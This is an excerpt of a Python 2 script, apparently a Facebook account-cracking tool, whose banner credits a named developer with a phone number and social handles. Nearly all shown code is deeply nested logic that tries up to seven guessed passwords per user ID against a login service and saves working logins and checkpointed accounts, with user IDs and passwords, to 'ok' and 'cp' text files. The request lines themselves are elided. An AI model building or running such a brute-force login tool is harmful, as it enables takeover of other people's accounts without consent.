...
\033[1;94m██  ██ ██ ██ ██   ██ ██    ██ ██   ██
\033[1;95m██   ████ ██ ██   ██  ██████  ██████
     "\033[1;92m➣ \033[1;92mDEVOLPER   :            KHALID SHAIFULLAH
     \033[1;91m➣ \033[1;92mFACEBOOK   :            KHALID SHAIFULLAH
     \033[1;93m➣ \033[1;92mWHATSAPP   :            01798396843[NOT FOR CALL] 
     \033[1;96m➣ \033[1;92mGITHUB     :            Khalid2009sm
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;31m [KHALID-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("KHALID-SHAIFULLAHok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;32m [KHALID-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("KHALID-SHAIFULLAHcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;33m [KHALID-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("KHALID-SHAIFULLAHok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;34m [KHALID-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("KHALID-SHAIFULLAHcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;35m [KHALID-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("KHALID-SHAIFULLAHok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;36m [KHALID-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("KHALID-SHAIFULLAHcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;31m [KHALID-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("KHALID-SHAIFULLAHok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;32m [KHALID-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("KHALID-SHAIFULLAHcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;33m [KHALID-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("KHALID-SHAIFULLAHok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;34m [KHALID-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("KHALID-SHAIFULLAHcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;35m [KHALID-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("KHALID-SHAIFULLAHok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;36m [KHALID-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("KHALID-SHAIFULLAHcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;31m [KHALID-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("KHALID-SHAIFULLAHok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;32m [KHALID-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("KHALID-SHAIFULLAHcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
...
def choice_select():
	...
	print("\x1b[1;92m  The Process has been started ✓")
	print("\033[1;93m  Plz Wait To Crack Accounts")
	print("\x1b[1;94m  Press ctrl + z to stop")
	print '••••••••••••••••••••••••••••••••••••••••••••••••••••••••'
	print("")
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [KHALID-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("KHALID-SHAIFULLAHok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;31m [KHALID-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("KHALID-SHAIFULLAHcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;36m [KHALID-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("KHALID-SHAIFULLAHok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;35m [KHALID-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("KHALID-SHAIFULLAHcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;34m [KHALID-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("KHALID-SHAIFULLAHok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [KHALID-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("KHALID-SHAIFULLAHcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [KHALID-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("KHALID-SHAIFULLAHok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;31m [KHALID-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("KHALID-SHAIFULLAHcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;36m [KHALID-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("KHALID-SHAIFULLAHok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;35m [KHALID-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("KHALID-SHAIFULLAHcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;34m [KHALID-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("KHALID-SHAIFULLAHok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;23m [KHALID-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("KHALID-SHAIFULLAHcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [KHALID-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("KHALID-SHAIFULLAHok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;31m [KHALID-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("KHALID-SHAIFULLAHcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
